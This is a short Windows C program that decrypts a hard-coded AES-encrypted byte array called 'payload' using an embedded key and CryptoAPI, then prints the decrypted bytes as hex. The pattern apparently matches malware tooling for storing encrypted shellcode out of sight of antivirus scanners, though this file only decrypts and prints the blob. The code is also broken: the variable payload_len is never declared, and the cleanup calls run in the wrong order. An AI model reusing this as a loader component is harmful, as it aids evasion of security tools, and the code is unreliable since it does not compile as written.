#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>

unsigned char key[] = { 0x13, 0x41, 0x98, 0x7b, 0x17, 0x14, 0xec, 0x3e, 0x3e, 0x13, 0xc5, 0x1e, 0x5b, 0x56, 0x45, 0x8c };
unsigned char payload[] = { 0x47, 0xcf, 0xba, 0x6c, 0xe9, 0x1f, 0xe4, 0x1f, 0x11, 0xda, 0x24, 0xb7, 0x57, 0xf2, 0x6a, 0x54, 0x53, 0xd7, 0xdb, 0x3a, 0x6e, 0x29, 0xc3, 0x14, 0x1e, 0x78, 0x13, 0x2d, 0x2d, 0x7b, 0x68, 0x3a, 0x7d, 0xd9, 0x5a, 0xc, 0xc7, 0x4c, 0x3b, 0xe4, 0xbd, 0x3f, 0x11, 0xcb, 0xb8, 0x1e, 0x7b, 0x24, 0x2a, 0x2e, 0x6a, 0x3d, 0x1c, 0x90, 0x8b, 0x6e, 0x8d, 0xe1, 0x76, 0xdf, 0xe0, 0x7b, 0xa9, 0x81, 0x61, 0xa6, 0x64, 0x52, 0xc6, 0x31, 0xcf, 0xd8, 0x41, 0xa5, 0xf0, 0x6b, 0x1b, 0x3f, 0x4b, 0xf, 0xaf, 0xcf, 0xb, 0xb9, 0x5e, 0x78, 0x73, 0xbc, 0x97, 0x3f, 0xb7, 0x6f, 0x92, 0x5f, 0xdb, 0xb, 0xe9, 0x98, 0x75, 0xe, 0x36, 0x0, 0x56, 0x2, 0x2e, 0xe5, 0xd, 0xe4, 0x70, 0x6c, 0x44, 0x48, 0xaa, 0x77, 0x74, 0xbc, 0x5c, 0x8d, 0xff, 0x43, 0xa5, 0x41, 0x4b, 0x62, 0x92, 0xcb, 0xdc, 0xe6, 0x1b, 0xaa, 0x5b, 0xda, 0x16, 0x2f, 0x8a, 0x59, 0x1a, 0x2a, 0x87, 0x38, 0x90, 0xac, 0x30, 0x36, 0x12, 0x54, 0x18, 0x55, 0xd9, 0xe1, 0x44, 0x82, 0xfe, 0xb3, 0x1c, 0x5e, 0xfd, 0xb1, 0x7, 0x9b, 0xab, 0xd7, 0x9a, 0x8e, 0xf8, 0xcb, 0xf9, 0x7f, 0x95, 0xb6, 0xac, 0xde, 0x33, 0x34, 0x4c, 0x45, 0x4, 0x62, 0xa, 0xd0, 0x7a, 0xd5, 0xab, 0x16, 0xa0, 0x57, 0xc5, 0x33, 0x7c, 0xd1, 0xf0, 0xda, 0x56, 0x81, 0x57, 0xb, 0xa0, 0xfe, 0x20, 0x72, 0x84, 0xa5, 0x9e, 0x6d, 0xd2, 0x5a, 0x9f, 0xb8, 0x69, 0x81, 0x6e, 0x8a, 0xd1, 0x38, 0x83, 0xa3, 0xd6, 0x37, 0x8c, 0xba, 0x6e, 0xac, 0xd0, 0x91, 0x1f, 0xfc, 0xb8, 0xd, 0x54, 0x8b, 0x11, 0xae, 0xfd, 0x69, 0xa2, 0xbb, 0xb7, 0xd3, 0x65, 0xcf, 0x56, 0xe7, 0xa5, 0x2e, 0xf6, 0x67, 0x97, 0x1b, 0x75, 0xd9, 0x19, 0xfc, 0xac, 0x60, 0x9a, 0x6e, 0x33, 0xac, 0xe9, 0x61, 0x70, 0x98, 0x87, 0xe0, 0x12, 0x72, 0xdc, 0xba, 0xab, 0xc6, 0x15, 0xcf, 0x11, 0xac, 0x4f, 0x91, 0xe, 0x23, 0x96, 0x4, 0xd6, 0x75, 0x82, 0xdb, 0x9b, 0x1d, 0x13, 0x1c, 0xa8, 0xed, 0xd2, 0xc6, 0x6b, 0xc4, 0x16, 0xe, 0x44, 0x56, 0x94, 0xe, 0xcd, 0x8e, 0x37, 0xb4, 0xf6, 0x18, 0x55, 0xa9, 0x5e, 0x5d, 0x6e, 0xc9, 0x6b, 0x97, 0x56, 0xba, 0x73, 0x92, 0x86, 0x71, 0x6c, 0x41, 0x6a, 0xa4, 0xf6, 0x17, 0xcf, 0x45, 0xc9, 0x74, 0x63, 0x20, 0xa5, 0x41, 0x47, 0xde, 0xc9, 0x4b, 0x73, 0x9a, 0xcd, 0x3c, 0xbf, 0x2a, 0xce, 0x5, 0x1c, 0xf3, 0x3c, 0x44, 0x24, 0xa4, 0x7, 0xfb, 0xe3, 0x3e, 0x67, 0xbb, 0xfa, 0x2a, 0x56, 0xbc, 0x4f, 0x59, 0x43, 0xda, 0xb1, 0x7e, 0xf, 0x57, 0xfd, 0xdf, 0xfb, 0x95, 0x47, 0xc2, 0xcd, 0xa1, 0x22, 0x3e, 0xd4, 0xf9, 0x2f, 0x12, 0xc1, 0x89, 0xa5, 0xc3, 0x2b, 0xde, 0x68, 0x7c, 0xd3, 0x92, 0x9, 0x1d, 0x62, 0x16, 0xa7, 0xa, 0x4, 0xd3, 0x83, 0xae, 0x2b, 0x95, 0xa1, 0x9d, 0x52, 0xb8, 0xe0, 0xcd, 0x96, 0xfa, 0xa, 0xf9, 0x76, 0xe1, 0x4f, 0x11, 0x92, 0xae, 0xf3, 0xdf, 0x82, 0x6e, 0xdb, 0x53, 0x6d, 0xeb, 0xe5, 0xdf, 0x1a, 0x41, 0x11, 0xdb, 0x33, 0x33, 0x40, 0xd9, 0xbd, 0x7e, 0xca, 0x28, 0x3e, 0xb1, 0x16, 0x3c, 0xd0, 0xb1, 0x6b, 0x2, 0x83, 0xb, 0xe, 0xea, 0x80, 0x94, 0xdb, 0xa3, 0x61, 0x2b, 0xb9, 0xec, 0xaa, 0x79, 0x84, 0x12, 0xd1, 0xca, 0x62, 0x43, 0xf4, 0xe2, 0x4e, 0x1f, 0x37, 0x82, 0x39, 0x5d, 0xa9, 0x86, 0xce, 0x41, 0xe2, 0x3a, 0xc8, 0x78, 0xb0, 0xd8, 0xad, 0x27, 0x76, 0x78, 0xfa, 0x79, 0x7b, 0x91, 0x5b, 0xc9, 0xa7, 0x90, 0xa0, 0xba, 0xcd, 0xf3, 0x6e, 0xc8, 0xd7, 0x84, 0x74, 0xf0, 0x53, 0xf4, 0xd2, 0x72, 0xab, 0x5, 0xca, 0xfe, 0x61, 0xf7, 0xdb, 0xf8, 0x88, 0xfc, 0xfc, 0xe, 0x76, 0x4, 0x86, 0x2c, 0x52, 0xad, 0x23, 0x6b, 0xb5, 0xff, 0xc7, 0x88, 0xdf, 0x5b, 0xdb, 0x5d, 0x4, 0x65, 0x7f, 0xab, 0x5d, 0x2b, 0xc0, 0x29, 0x58, 0x43, 0xeb, 0xb3, 0xb5, 0x5c, 0xa, 0x60, 0xd2, 0x3c, 0x40, 0x6, 0x7d, 0x69, 0x35, 0x28, 0xa7, 0x5c, 0x14, 0x26, 0xf6, 0x3a, 0x16, 0x59, 0xe5, 0x35, 0x63, 0x15, 0xf0, 0x6e, 0x67, 0x31, 0x58, 0x5b, 0xac, 0xaa, 0x98, 0x22, 0x48, 0xc5, 0xa5, 0xf8, 0x67, 0x9a, 0x52, 0x9b, 0xdd, 0x64, 0x15, 0x31, 0xe4, 0x92, 0xc3, 0x53, 0x3f, 0xd9, 0xdb, 0x96, 0xa8, 0x98, 0xe0, 0xd0, 0x1a, 0x67, 0x7c, 0xc8, 0x2, 0x0, 0xcd, 0xc3, 0x19, 0xdb, 0x3d, 0x3b, 0x56, 0xa6, 0x0, 0x29, 0xd0, 0x5c, 0x89, 0xe9, 0xfd, 0xd1, 0x92, 0x64, 0xb4, 0x5d, 0x6f, 0x50, 0x73, 0x63, 0x59, 0xc1, 0xb2, 0xb6, 0x6, 0x7c, 0x2b, 0x66, 0x9d, 0x75, 0x58, 0xc8, 0x7d, 0xcd, 0xc, 0x5a, 0x5b, 0x57, 0x55, 0xde, 0x55, 0xf1, 0xac, 0xe9, 0x97, 0xb8, 0xb3, 0xc, 0xe1, 0xff, 0x85, 0x8e, 0xef, 0x2e, 0x26, 0xc3, 0x46, 0x40, 0xf7, 0xf2, 0x6a, 0x1, 0xf3, 0x30, 0x7e, 0x4b, 0xc4, 0xbb, 0xf6, 0x56, 0xd, 0xc0, 0xf3, 0x44, 0x7a, 0x85, 0x64, 0x70, 0xcc, 0x89, 0x47, 0x2d, 0xfc, 0x88, 0xde, 0x9c, 0xb2, 0x60, 0xba, 0xb1, 0x7a, 0x62, 0xba, 0x1a, 0xf9, 0xb7, 0x23, 0xb8, 0x61, 0x3e, 0xf5, 0xca, 0x82, 0x68, 0x26, 0xf1, 0x5b, 0xb4, 0xd2, 0x1b, 0x4b, 0x0, 0xc5, 0x54, 0xc3, 0x57, 0x80, 0x11, 0x62, 0x12, 0x3c, 0x18, 0x9, 0xae, 0xb6, 0xb0, 0xb, 0x98, 0x30, 0xc5, 0x7a, 0x99, 0xca, 0x7e, 0x46, 0xf4, 0xd6, 0x59, 0xc4, 0xd7, 0x44, 0xbb, 0x43, 0xd5, 0xe7, 0xb7, 0x8b, 0x85, 0x57, 0x18, 0x2b, 0x48, 0xa5, 0x59, 0x5b, 0xf3, 0xa7, 0x56, 0x10, 0xd9, 0x57, 0xdb, 0xe0, 0x9d, 0x4a, 0xc3, 0xdd, 0x16, 0x82, 0x48, 0x41, 0x3e, 0xd4, 0xb2, 0x32, 0x82, 0x64, 0x90, 0xad, 0x2f, 0xfd, 0x4a, 0xa6, 0x18, 0xb0, 0xd1, 0x2b, 0xcc, 0xe8, 0x34, 0x46, 0x8c, 0x96, 0xb2, 0x5b, 0xe4, 0xf2, 0xd9, 0xa6, 0x5e, 0x4, 0xcc, 0xab, 0xe8, 0x4c, 0xe8, 0xd6, 0x29, 0xfd, 0x7a, 0xd6, 0x1e, 0x51, 0xb8, 0x4, 0x7c, 0x10, 0xff, 0x89, 0x38, 0xd2, 0x78, 0x7f, 0x1b, 0x2e, 0xdb, 0x4f, 0xd0, 0x61, 0x5c, 0xaa, 0x2f, 0x9c, 0xf3, 0xa1, 0xb3, 0xa9, 0x63, 0xcd, 0x9b, 0x7a, 0xa2, 0xb2, 0xd3, 0xbc, 0xed, 0xae, 0x31, 0x1b, 0x7a, 0xc8, 0x64, 0x97, 0x6b, 0x65, 0x95, 0xd5, 0xda, 0x52, 0x1d, 0x79, 0xf9, 0x4f, 0x41, 0xf8, 0x72, 0x3, 0x29, 0x30, 0x8c, 0xc, 0x90 };

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}

int main(void)
{
	payload_len = sizeof(payload);
	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
	int i = 0;
	for(i; i < payload_len; i++)
	{
		printf("%02x ", payload[i]);
	}
	printf("\n");
}
